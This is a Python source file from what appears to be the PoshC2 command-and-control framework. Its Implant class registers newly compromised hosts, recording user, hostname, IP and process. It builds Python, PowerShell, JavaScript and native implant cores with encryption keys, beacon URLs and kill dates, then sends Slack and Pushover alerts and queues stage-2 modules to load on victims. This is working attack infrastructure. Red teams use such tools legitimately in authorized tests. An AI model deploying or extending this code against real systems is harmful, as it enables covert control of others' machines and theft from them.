import urllib, base64, http.client, re
from datetime import datetime, timezone

from poshc2.Colours import Colours
from poshc2.Utils import randomuri, gen_key
from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, Jitter, NotificationsProjectName
from poshc2.server.Core import get_images
from poshc2.server.AutoLoads import run_autoloads
from poshc2.server.database.DB import select_item, get_defaultbeacon, get_killdate, get_dfheader, get_otherbeaconurls, update_label
from poshc2.server.database.DB import get_defaultuseragent, new_implant, new_task, update_mods, get_autoruns, get_notificationstatus, get_url_by_id


class Implant(object):

    def __init__(self, ipaddress, pivot, domain, user, hostname, arch, pid, procname, URLID):
        self.RandomURI = randomuri()
        self.URLID = URLID,
        self.Label = None
        self.User = user
        self.Hostname = hostname
        self.IPAddress = ipaddress
        self.Key = gen_key().decode("utf-8")
        self.FirstSeen = (datetime.now(timezone.utc)).strftime("%Y-%m-%d %H:%M:%S")
        self.LastSeen = (datetime.now(timezone.utc)).strftime("%Y-%m-%d %H:%M:%S")
        self.PID = pid
        self.ProcName = procname
        self.Arch = arch
        self.Domain = domain
        self.DomainFrontHeader = get_dfheader()
        self.Alive = "Yes"
        self.UserAgent = get_defaultuseragent()
        self.Sleep = get_defaultbeacon()
        self.ModsLoaded = ""
        self.Jitter = Jitter
        self.ImplantID = ""
        self.Pivot = pivot
        self.KillDate = get_killdate()
        self.ServerURL = select_item("PayloadCommsHost", "C2Server")
        self.AllBeaconURLs = get_otherbeaconurls()
        self.AllBeaconImages = get_images()
        self.SharpCore = """
RANDOMURI19901%s10991IRUMODNAR
URLS10484390243%s34209348401SLRU
KILLDATE1665%s5661ETADLLIK
SLEEP98001%s10089PEELS
JITTER2025%s5202RETTIJ
NEWKEY8839394%s4939388YEKWEN
IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDate, self.Sleep, self.Jitter, self.Key, self.AllBeaconImages)
        with open("%spy_dropper.sh" % (PayloadsDirectory), 'rb') as f:
            self.PythonImplant = base64.b64encode(f.read()).decode("utf-8")
        py_implant_core = open("%s/Implant-Core.py" % PayloadTemplatesDirectory, 'r').read()
        self.PythonCore = py_implant_core % (self.DomainFrontHeader, self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Jitter, self.Key, self.RandomURI, self.UserAgent)
        with open('/tmp/pythoncore.py', 'w') as output:
            output.write(self.PythonCore)
        ps_implant_core = open("%s/Implant-Core.ps1" % PayloadTemplatesDirectory, 'r').read()
        self.PSCore = ps_implant_core % (self.Key, self.Jitter, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs)  # Add all db elements def display(self):
        jxa_implant_core = open("%s/Implant-Core.js" % PayloadTemplatesDirectory, 'r').read()
        self.JXACore = jxa_implant_core % (self.Key, self.Jitter, self.Sleep, self.AllBeaconImages, self.RandomURI, self.ServerURL, self.KillDate, self.AllBeaconURLs)
        self.NativeCore = open("%s/stage2core.so" % PayloadTemplatesDirectory, 'rb').read().replace(b"RANDOMURI199011", self.RandomURI.encode('utf-8')).replace(b"RANDOMKEYDATAWENEEDTOFILLINLATERWITHSOMETHIN", self.Key.encode('utf-8'))

    # Add all db elements

    def display(self):
        print(Colours.GREEN, "")
        it = self.Pivot
        if "pbind" in it.lower():
            urlInfo = "PBind"
        if "fcomm" in it.lower():
            urlInfo = "FComm"
        else:
            urlInfo = get_url_by_id(self.URLID[0])
            if urlInfo is not None:
                urlInfo = f"URL: {urlInfo[1]}"
            else:
                urlInfo = "URL: Unknown"

        print("[%s] New %s implant connected: (uri=%s key=%s)" % (self.ImplantID, it, self.RandomURI, self.Key))
        print("%s | Time:%s | PID:%s | Process:%s | Sleep:%s | %s (%s) | %s" % (self.IPAddress, self.FirstSeen, str(self.PID), str(self.ProcName), str(self.Sleep), (str(self.User) + " @ " + str(self.Hostname)), self.Arch, urlInfo))
        EnableNotifications = get_notificationstatus()

        try:
            Pushover_APIToken = select_item("Pushover_APIToken", "C2Server")
            Pushover_APIUser = select_item("Pushover_APIUser", "C2Server")
            if EnableNotifications.lower().strip() == "yes" and Pushover_APIToken:
                conn = http.client.HTTPSConnection("api.pushover.net:443")
                conn.request("POST", "/1/messages.json",
                                 urllib.parse.urlencode({
                                     "token": Pushover_APIToken,
                                     "user": Pushover_APIUser,
                                     "message": "[%s] - New Implant: %s @ %s" % (NotificationsProjectName, self.User, self.Hostname),
                                 }), {"Content-type": "application/x-www-form-urlencoded"})
                output = conn.getresponse()
                if output.status != 200:
                    data = output.read()
                    print("\nPushover error: ")
                    print(data)
        except Exception as e:
            print("Pushover send error: %s" % e)
        try:
            Slack_BotToken = select_item("Slack_BotToken", "C2Server")
            if EnableNotifications.lower().strip() == "yes" and Slack_BotToken:
                mention_userid = select_item("Slack_UserID", "C2Server")
                channel = select_item("Slack_Channel", "C2Server")
                Slack_BotToken = str("Bearer ")+Slack_BotToken
                if mention_userid in ("", None):
                    mention_userid = ""
                elif mention_userid.lower().strip() == "channel":
                    mention_userid = "<!channel> "
                else:
                    mention_userid = "<@%s> " % str(mention_userid)
                message = {"channel": channel, "text": "%s[%s] - New Implant: %s @ %s" % (mention_userid, NotificationsProjectName, self.User, self.Hostname), "as_user": "true", "link_names": "true"}
                headers = {"Content-type": "application/json","Authorization": Slack_BotToken }
                conn = http.client.HTTPSConnection("slack.com:443")
                conn.request("POST", "/api/chat.postMessage",json.dumps(message), headers)
                output = conn.getresponse()
                if output.status != 200:
                    data = output.read()
                    print("Slack error: ")
                    print(data)
        except Exception as e:
            print("Slack send error: %s" % e)



    def save(self):
        self.ImplantID = new_implant(self.RandomURI, self.URLID[0], self.User, self.Hostname, self.IPAddress, self.Key, self.FirstSeen, self.FirstSeen, self.PID, self.ProcName, self.Arch, self.Domain, self.Alive, self.Sleep, self.ModsLoaded, self.Pivot, self.Label)

    def autoruns(self):
        if "C#" in self.Pivot:
            new_task("loadmodule Stage2-Core.exe", "autoruns", self.RandomURI)
            new_task("loadmodule PwrStatusTracker.dll", "autoruns", self.RandomURI)
            new_task("loadpowerstatus", "autoruns", self.RandomURI)
            update_mods("Stage2-Core.exe PwrStatusTracker.dll", self.RandomURI)
            update_label("PSM", self.RandomURI)
        if "PS" in self.Pivot:
            new_task("loadmodule Stage2-Core.ps1", "autoruns", self.RandomURI)
            update_mods("Stage2-Core.ps1", self.RandomURI)
        if "PBind Pivot" in self.Pivot:
            update_label("Parent: %s" % self.IPAddress, self.RandomURI)
            #new_task("pbind-pivot-loadmodule Stage2-Core.exe", "autoruns", self.IPAddress)
            update_mods("Stage2-Core.exe", self.RandomURI)
        elif "PB" in self.Pivot:
            update_label("Parent: %s" % self.IPAddress, self.RandomURI)
            #new_task("pbind-loadmodule Stage2-Core.exe", "autoruns", self.IPAddress)
            update_mods("Stage2-Core.exe", self.RandomURI)
        if "FC" in self.Pivot:
            update_label("Parent: %s" % self.IPAddress, self.RandomURI)
            new_task("fcomm-loadmodule Stage2-Core.exe", "autoruns", self.RandomURI)
            update_mods("Stage2-Core.exe", self.RandomURI)
        result = get_autoruns()
        if result:
            for autorun in result:
                run_autoloads(autorun[1], self.RandomURI, "autoruns")
                new_task(autorun[1], "autoruns", self.RandomURI)
